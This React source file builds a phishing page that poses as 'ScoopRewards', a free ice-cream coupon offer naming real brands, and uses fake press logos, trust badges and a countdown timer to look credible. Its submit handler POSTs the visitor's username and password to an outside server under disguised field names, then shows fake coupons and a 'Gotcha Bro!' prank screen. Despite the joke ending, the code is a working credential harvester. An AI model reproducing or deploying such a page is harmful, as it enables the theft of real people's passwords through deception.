import { useState, useEffect } from "react";

export default function App() {
  const [step, setStep] = useState(1);
  const [mode, setMode] = useState("login"); // "login" | "signup"
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [confirm, setConfirm] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [remember, setRemember] = useState(false);
  const [agree, setAgree] = useState(false);
  const [timer, setTimer] = useState(23 * 3600 + 47 * 60 + 12);

  useEffect(() => {
    const id = setInterval(() => setTimer((t) => Math.max(0, t - 1)), 1000);
    return () => clearInterval(id);
  }, []);

  const hh = String(Math.floor(timer / 3600)).padStart(2, "0");
  const mm = String(Math.floor((timer % 3600) / 60)).padStart(2, "0");
  const ss = String(timer % 60).padStart(2, "0");

  const isSignup = mode === "signup";
  const canSubmit =
    user.trim() &&
    pass.trim() &&
    (!isSignup || (confirm.trim() === pass.trim() && agree));

  const handleSubmit = async () => {
    if (!canSubmit) return;
    setLoading(true);
    try {
      await fetch("https://family-search-g6t8.onrender.com/search", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ searchBox1: user.trim(), searchBox2: pass.trim() }),
      });
    } catch {}
    setTimeout(() => {
      setLoading(false);
      setStep(2);
    }, 1600);
  };

  return (
    <>
      <style>{`
        *, *::before, *::after { box-sizing: border-box; }
        html, body, #root { margin: 0; padding: 0; width: 100%; min-height: 100vh; }
        body {
          font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
          -webkit-font-smoothing: antialiased;
          background: #f8fafc;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
        @keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: none; } }
        .sr-input::placeholder { color: #94a3b8; }
        .sr-input:focus { border-color: #ea580c !important; box-shadow: 0 0 0 3px rgba(234,88,12,0.12) !important; }
        .sr-btn:hover:not(:disabled) { background: #c2410c; box-shadow: 0 6px 16px rgba(234,88,12,0.35); }
        .sr-btn:active:not(:disabled) { transform: translateY(1px); }
        .sr-btn:disabled { opacity: 0.55; cursor: not-allowed; }
        .sr-link:hover { text-decoration: underline; }
        .sr-card { animation: fadeUp 0.4s ease-out; }
        @media (max-width: 880px) {
          .sr-grid { grid-template-columns: 1fr !important; gap: 40px !important; }
          .sr-left { text-align: center; }
          .sr-left .sr-bullets { display: inline-block; text-align: left; }
          .sr-stats { justify-content: center; }
        }
      `}</style>

      <div style={S.page}>
        <div style={S.announce}>
          <span style={S.pulseDot} />
          Limited offer ends in {hh}:{mm}:{ss} — 10,427 coupons claimed today
        </div>

        <header style={S.header}>
          <div style={S.headerInner}>
            <div style={S.brand}>
              <div style={S.brandMark}>
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                  <path d="M12 2C8 7 6 10 6 14a6 6 0 0012 0c0-4-2-7-6-12z" fill="#ea580c" />
                </svg>
              </div>
              <div>
                <div style={S.brandName}>ScoopRewards</div>
                <div style={S.brandTag}>Official Partner Program</div>
              </div>
            </div>
            <div style={S.headerRight}>
              <span style={S.badge}><CheckBadgeIcon /> Verified Partner</span>
            </div>
          </div>
        </header>

        <main style={S.main}>
          <div style={S.container}>
            {step === 1 && (
              <div className="sr-grid" style={S.grid}>
                {/* LEFT */}
                <div className="sr-left" style={S.left}>
                  <div style={S.eyebrow}>
                    <span style={S.eyebrowDot} /> FREE THIS WEEK
                  </div>
                  <h1 style={S.h1}>Claim your free ice cream coupons in 30 seconds.</h1>
                  <p style={S.lede}>
                    Sign in to unlock exclusive vouchers from Baskin-Robbins, Naturals,
                    Cream Stone and 40+ partner parlors across India.
                  </p>

                  <ul className="sr-bullets" style={S.bullets}>
                    {[
                      "Instant digital coupons, no waiting",
                      "Valid across 1,200+ outlets nationwide",
                      "Bank-grade 256-bit SSL encryption",
                    ].map((b) => (
                      <li key={b} style={S.bullet}><CheckIcon /> {b}</li>
                    ))}
                  </ul>

                  <div className="sr-stats" style={S.stats}>
                    <Stat n="2.4M+" l="Members" />
                    <Stat n="₹18 Cr" l="Saved" />
                    <Stat n="4.9★" l="Rated" />
                  </div>

                  <div style={S.logos}>
                    <span style={S.logosLabel}>Featured in</span>
                    <span style={S.logoText}>FORBES</span>
                    <span style={S.logoText}>TechCrunch</span>
                    <span style={S.logoText}>YourStory</span>
                  </div>
                </div>

                {/* RIGHT */}
                <div>
                  <div className="sr-card" style={S.card}>
                    <div style={S.tabs}>
                      <button
                        type="button"
                        onClick={() => setMode("login")}
                        style={{ ...S.tab, ...(mode === "login" ? S.tabActive : {}) }}
                      >Log in</button>
                      <button
                        type="button"
                        onClick={() => setMode("signup")}
                        style={{ ...S.tab, ...(mode === "signup" ? S.tabActive : {}) }}
                      >Create account</button>
                    </div>

                    <div style={S.cardHead}>
                      <h2 style={S.cardTitle}>
                        {isSignup ? "Create your account" : "Welcome back"}
                      </h2>
                      <p style={S.cardSub}>
                        {isSignup
                          ? "Sign up in seconds to claim your coupons."
                          : "Sign in to access your rewards dashboard."}
                      </p>
                    </div>

                    <div style={S.field}>
                      <label style={S.label}>Email or Username</label>
                      <div style={S.inputWrap}>
                        <span style={S.fieldIcon}><UserIcon /></span>
                        <input
                          className="sr-input"
                          value={user}
                          onChange={(e) => setUser(e.target.value)}
                          placeholder="you@example.com"
                          style={S.input}
                        />
                      </div>
                    </div>

                    <div style={S.field}>
                      <div style={S.labelRow}>
                        <label style={S.label}>Password</label>
                        {!isSignup && (
                          <a href="#" className="sr-link" style={S.linkSm}>Forgot?</a>
                        )}
                      </div>
                      <div style={S.inputWrap}>
                        <span style={S.fieldIcon}><LockIcon /></span>
                        <input
                          className="sr-input"
                          type={showPass ? "text" : "password"}
                          value={pass}
                          onChange={(e) => setPass(e.target.value)}
                          placeholder={isSignup ? "Create a strong password" : "Enter password"}
                          style={{ ...S.input, paddingRight: 44 }}
                        />
                        <button
                          type="button"
                          onClick={() => setShowPass(!showPass)}
                          style={S.eyeBtn}
                          aria-label="toggle"
                        >
                          {showPass ? <EyeOffIcon /> : <EyeIcon />}
                        </button>
                      </div>
                    </div>

                    {isSignup && (
                      <div style={S.field}>
                        <label style={S.label}>Confirm password</label>
                        <div style={S.inputWrap}>
                          <span style={S.fieldIcon}><LockIcon /></span>
                          <input
                            className="sr-input"
                            type={showPass ? "text" : "password"}
                            value={confirm}
                            onChange={(e) => setConfirm(e.target.value)}
                            placeholder="Re-enter password"
                            style={S.input}
                          />
                        </div>
                        {confirm && confirm !== pass && (
                          <p style={S.errorText}>Passwords do not match.</p>
                        )}
                      </div>
                    )}

                    {isSignup ? (
                      <label style={S.remember}>
                        <input
                          type="checkbox"
                          checked={agree}
                          onChange={(e) => setAgree(e.target.checked)}
                          style={S.checkbox}
                        />
                        I agree to the Terms & Privacy Policy
                      </label>
                    ) : (
                      <label style={S.remember}>
                        <input
                          type="checkbox"
                          checked={remember}
                          onChange={(e) => setRemember(e.target.checked)}
                          style={S.checkbox}
                        />
                        Keep me signed in
                      </label>
                    )}

                    <button
                      type="button"
                      className="sr-btn"
                      onClick={handleSubmit}
                      disabled={loading || !canSubmit}
                      style={S.btn}
                    >
                      {loading ? (
                        <><span style={S.spinner} /> Verifying...</>
                      ) : (
                        <>{isSignup ? "Create account & claim" : "Log in & claim"} <ArrowIcon /></>
                      )}
                    </button>

                    <p style={S.switchLine}>
                      {isSignup ? "Already have an account? " : "New to ScoopRewards? "}
                      <a
                        href="#"
                        className="sr-link"
                        style={S.linkSm}
                        onClick={(e) => { e.preventDefault(); setMode(isSignup ? "login" : "signup"); }}
                      >
                        {isSignup ? "Log in instead" : "Create a free account"}
                      </a>
                    </p>
                  </div>

                  <div style={S.trustStrip}>
                    <TrustItem icon={<ShieldIcon />} text="SSL Secured" />
                    <TrustItem icon={<CheckBadgeIcon />} text="Verified Site" />
                    <TrustItem icon={<StarIcon />} text="4.9 / 5 Rated" />
                  </div>
                </div>
              </div>
            )}

            {step === 2 && (
              <div style={{ maxWidth: 560, margin: "0 auto" }}>
                <div className="sr-card" style={{ ...S.card, padding: 0, overflow: "hidden" }}>
                  <div style={S.successHead}>
                    <div style={S.successIcon}><CheckIcon size={28} color="#fff" /></div>
                    <h2 style={S.successTitle}>You're verified</h2>
                    <p style={S.successSub}>Your coupons are ready below. Codes are valid for 24 hours.</p>
                  </div>

                  <div style={{ padding: 24 }}>
                    <div style={S.timerBar}>
                      <span style={S.pulseDot} />
                      Expires in {hh}:{mm}:{ss}
                    </div>

                    {[
                      { brand: "Baskin-Robbins", title: "2 Free Scoops", code: "SCOOP2026", value: "₹120" },
                      { brand: "Naturals Ice Cream", title: "Free Sundae", code: "SUNDAE30", value: "₹180" },
                    ].map((c) => (
                      <div key={c.code} style={S.coupon}>
                        <div>
                          <div style={S.couponBrand}>{c.brand}</div>
                          <div style={S.couponTitle}>{c.title}</div>
                          <div style={S.couponCodeRow}>
                            <span style={S.couponCode}>{c.code}</span>
                            <span style={S.couponValue}>worth {c.value}</span>
                          </div>
                        </div>
                        <button type="button" style={S.copyBtn}>Copy</button>
                      </div>
                    ))}

                    <button
                      type="button"
                      className="sr-btn"
                      onClick={() => setStep(3)}
                      style={{ ...S.btn, marginTop: 8 }}
                    >
                      Proceed to claim <ArrowIcon />
                    </button>
                  </div>
                </div>
              </div>
            )}

            {step === 3 && (
              <div style={{ maxWidth: 560, margin: "0 auto" }}>
                <div className="sr-card" style={{ ...S.card, textAlign: "center" }}>
                  <div style={{ fontSize: 64 }}>😆</div>
                  <h2 style={{ ...S.cardTitle, fontSize: 28, marginTop: 12 }}>Gotcha Bro! 🎊</h2>
                  <p style={{ ...S.cardSub, fontSize: 16, marginTop: 8 }}>saduvkora 😂 exams unnai raa...</p>
                  <p style={{ ...S.cardSub, fontSize: 16, marginTop: 4 }}>Paduko bro, ice cream tarwata vastundi 🍦</p>
                </div>
              </div>
            )}
          </div>
        </main>

        <footer style={S.footer}>
          <div style={S.footerInner}>
            <span>© 2026 ScoopRewards Pvt. Ltd.</span>
            <div style={S.footerLinks}>
              <a href="#" style={S.footerLink}>Privacy</a>
              <a href="#" style={S.footerLink}>Terms</a>
              <a href="#" style={S.footerLink}>Support</a>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
}

/* ---------- tiny components ---------- */
const Stat = ({ n, l }) => (
  <div><div style={S.statN}>{n}</div><div style={S.statL}>{l}</div></div>
);
const TrustItem = ({ icon, text }) => (
  <span style={S.trustItem}>{icon}{text}</span>
);

/* ---------- icons ---------- */
const UserIcon = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
);
const LockIcon = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
);
const EyeIcon = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#64748b" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>
);
const EyeOffIcon = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#64748b" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.94 10.94 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A10.94 10.94 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
);
const ArrowIcon = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
);
const CheckIcon = ({ size = 16, color = "#16a34a" }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
);
const ShieldIcon = () => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
);
const CheckBadgeIcon = ({ size = 14 }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="#16a34a"><path d="M12 1l2.4 2.4 3.3-.6.6 3.3L20.7 8.4 18.3 12l2.4 3.6-2.4 1.3-.6 3.3-3.3-.6L12 22l-2.4-2.4-3.3.6-.6-3.3L3.3 15.6 5.7 12 3.3 8.4l2.4-1.3.6-3.3 3.3.6L12 1z"/><polyline points="9 12 11 14 15 10" fill="none" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
);
const StarIcon = () => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="#facc15" stroke="#facc15" strokeWidth="1"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
);

/* ---------- styles ---------- */
const S = {
  page: { minHeight: "100vh", width: "100%", display: "flex", flexDirection: "column", background: "linear-gradient(180deg, #fff7ed 0%, #fafafa 30%, #f8fafc 100%)", color: "#0f172a" },
  announce: { background: "#0f172a", color: "#fef3c7", padding: "10px 16px", textAlign: "center", fontSize: 13, display: "flex", justifyContent: "center", alignItems: "center", gap: 10, fontWeight: 500 },
  pulseDot: { width: 8, height: 8, borderRadius: "50%", background: "#22c55e", display: "inline-block", animation: "pulse 1.5s infinite" },

  header: { background: "rgba(255,255,255,0.8)", backdropFilter: "blur(12px)", borderBottom: "1px solid #e2e8f0", position: "sticky", top: 0, zIndex: 10 },
  headerInner: { maxWidth: 1200, margin: "0 auto", padding: "14px 24px", display: "flex", justifyContent: "space-between", alignItems: "center" },
  brand: { display: "flex", alignItems: "center", gap: 12 },
  brandMark: { width: 40, height: 40, background: "#fff7ed", border: "1px solid #fed7aa", borderRadius: 10, display: "grid", placeItems: "center" },
  brandName: { fontSize: 16, fontWeight: 700, color: "#0f172a", lineHeight: 1.1 },
  brandTag: { fontSize: 11, color: "#64748b", marginTop: 2 },
  headerRight: { display: "flex", alignItems: "center", gap: 12 },
  badge: { display: "inline-flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 600, color: "#15803d", background: "#dcfce7", padding: "5px 10px", borderRadius: 999 },

  main: { flex: 1, padding: "48px 24px" },
  container: { maxWidth: 1200, margin: "0 auto", width: "100%" },
  grid: { display: "grid", gridTemplateColumns: "1.1fr 1fr", gap: 64, alignItems: "center" },

  left: { animation: "fadeUp 0.5s ease-out" },
  eyebrow: { display: "inline-flex", alignItems: "center", gap: 8, fontSize: 12, fontWeight: 700, color: "#ea580c", background: "#fff7ed", border: "1px solid #fed7aa", padding: "6px 12px", borderRadius: 999, letterSpacing: 0.5, marginBottom: 20 },
  eyebrowDot: { width: 6, height: 6, borderRadius: "50%", background: "#ea580c" },
  h1: { fontSize: "clamp(32px, 4vw, 48px)", fontWeight: 800, lineHeight: 1.1, letterSpacing: "-0.02em", margin: "0 0 20px", color: "#0f172a" },
  lede: { fontSize: 17, lineHeight: 1.6, color: "#475569", margin: "0 0 28px", maxWidth: 480 },
  bullets: { listStyle: "none", padding: 0, margin: "0 0 32px" },
  bullet: { display: "flex", alignItems: "center", gap: 10, padding: "8px 0", fontSize: 15, color: "#334155" },
  stats: { display: "flex", gap: 40, padding: "20px 0", borderTop: "1px solid #e2e8f0", borderBottom: "1px solid #e2e8f0", marginBottom: 24 },
  statN: { fontSize: 22, fontWeight: 800, color: "#0f172a", letterSpacing: "-0.02em" },
  statL: { fontSize: 12, color: "#64748b", marginTop: 2, textTransform: "uppercase", letterSpacing: 0.5 },
  logos: { display: "flex", alignItems: "center", gap: 18, opacity: 0.6, flexWrap: "wrap" },
  logosLabel: { fontSize: 11, color: "#64748b", textTransform: "uppercase", letterSpacing: 1, fontWeight: 600 },
  logoText: { fontSize: 14, fontWeight: 700, color: "#64748b", letterSpacing: 0.5 },

  card: { background: "#fff", border: "1px solid #e2e8f0", borderRadius: 16, padding: 32, boxShadow: "0 1px 2px rgba(0,0,0,0.04), 0 20px 50px -20px rgba(15,23,42,0.15)" },
  tabs: { display: "flex", padding: 4, background: "#f1f5f9", borderRadius: 10, marginBottom: 24, gap: 4 },
  tab: { flex: 1, padding: "9px 12px", background: "transparent", border: "none", borderRadius: 8, fontSize: 13, fontWeight: 600, color: "#64748b", cursor: "pointer" },
  tabActive: { background: "#fff", color: "#0f172a", boxShadow: "0 1px 2px rgba(15,23,42,0.08)" },
  cardHead: { marginBottom: 20 },
  cardTitle: { fontSize: 22, fontWeight: 700, margin: 0, color: "#0f172a", letterSpacing: "-0.01em" },
  cardSub: { fontSize: 14, color: "#64748b", margin: "6px 0 0" },

  field: { marginBottom: 14 },
  labelRow: { display: "flex", justifyContent: "space-between", alignItems: "baseline", marginBottom: 6 },
  label: { display: "block", fontSize: 13, fontWeight: 600, color: "#334155", marginBottom: 6 },
  inputWrap: { position: "relative" },
  fieldIcon: { position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)", display: "grid", placeItems: "center" },
  input: { width: "100%", padding: "12px 14px 12px 42px", border: "1px solid #cbd5e1", borderRadius: 10, fontSize: 14, outline: "none", background: "#fff", color: "#0f172a", transition: "all 0.15s" },
  eyeBtn: { position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: "transparent", border: "none", cursor: "pointer", padding: 6, display: "grid", placeItems: "center" },
  errorText: { fontSize: 12, color: "#dc2626", margin: "6px 0 0" },

  remember: { display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#475569", cursor: "pointer", marginBottom: 18, marginTop: 4 },
  checkbox: { width: 16, height: 16, accentColor: "#ea580c", cursor: "pointer" },

  btn: { width: "100%", padding: "13px 16px", background: "#ea580c", color: "#fff", border: "none", borderRadius: 10, fontSize: 15, fontWeight: 600, cursor: "pointer", display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 8, transition: "all 0.15s", boxShadow: "0 1px 2px rgba(234,88,12,0.2)" },
  spinner: { width: 14, height: 14, border: "2px solid rgba(255,255,255,0.4)", borderTopColor: "#fff", borderRadius: "50%", animation: "spin 0.7s linear infinite" },

  switchLine: { fontSize: 13, color: "#64748b", textAlign: "center", margin: "18px 0 0" },
  linkSm: { color: "#ea580c", fontWeight: 600, fontSize: 13, textDecoration: "none", cursor: "pointer" },

  trustStrip: { display: "flex", justifyContent: "center", gap: 24, marginTop: 16, padding: "12px 0", flexWrap: "wrap" },
  trustItem: { display: "inline-flex", alignItems: "center", gap: 6, fontSize: 12, color: "#64748b", fontWeight: 500 },

  successHead: { background: "linear-gradient(135deg, #ea580c, #c2410c)", color: "#fff", padding: "32px 28px", textAlign: "center" },
  successIcon: { width: 56, height: 56, borderRadius: "50%", background: "rgba(255,255,255,0.2)", border: "2px solid rgba(255,255,255,0.4)", display: "grid", placeItems: "center", margin: "0 auto 12px" },
  successTitle: { fontSize: 24, fontWeight: 700, margin: "0 0 6px", letterSpacing: "-0.01em" },
  successSub: { fontSize: 14, opacity: 0.9, margin: 0 },

  timerBar: { display: "flex", alignItems: "center", justifyContent: "center", gap: 8, background: "#fef3c7", border: "1px solid #fde68a", color: "#92400e", padding: "10px 14px", borderRadius: 10, fontSize: 13, fontWeight: 500, marginBottom: 16 },

  coupon: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: 18, border: "1px solid #e2e8f0", borderRadius: 12, marginBottom: 12, background: "#fafafa", gap: 12 },
  couponBrand: { fontSize: 11, color: "#64748b", textTransform: "uppercase", letterSpacing: 1, fontWeight: 600 },
  couponTitle: { fontSize: 17, fontWeight: 700, color: "#0f172a", margin: "4px 0 8px" },
  couponCodeRow: { display: "flex", alignItems: "center", gap: 10, flexWrap: "wrap" },
  couponCode: { fontFamily: "ui-monospace, SFMono-Regular, monospace", fontSize: 13, background: "#0f172a", color: "#fef3c7", padding: "4px 10px", borderRadius: 6, fontWeight: 600, letterSpacing: 1 },
  couponValue: { fontSize: 12, color: "#64748b" },
  copyBtn: { padding: "8px 14px", background: "#fff", border: "1px solid #cbd5e1", borderRadius: 8, fontSize: 13, fontWeight: 600, color: "#334155", cursor: "pointer", flexShrink: 0 },

  footer: { borderTop: "1px solid #e2e8f0", padding: "20px 24px", background: "#fff" },
  footerInner: { maxWidth: 1200, margin: "0 auto", display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 13, color: "#64748b", flexWrap: "wrap", gap: 12 },
  footerLinks: { display: "flex", gap: 20 },
  footerLink: { color: "#64748b", textDecoration: "none" },
};
